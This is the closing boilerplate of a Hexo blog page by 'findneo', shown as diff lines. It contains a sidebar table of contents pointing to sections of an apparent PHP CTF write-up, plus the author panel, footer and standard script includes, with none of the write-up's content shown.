href="#admin-php"><span class="nav-number">4.1.</span> <span class="nav-text">admin.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#character-php"><span class="nav-number">4.2.</span> <span class="nav-text">character.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-1"><span class="nav-number">4.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">4.3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">4.3.2.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">4.3.3.</span> <span class="nav-text">脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF%EF%BC%9A%E6%8B%BC%E6%8E%A5-SESSION-%E5%8F%98%E9%87%8F"><span class="nav-number">5.</span> <span class="nav-text">另一种思路：拼接$_SESSION 变量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
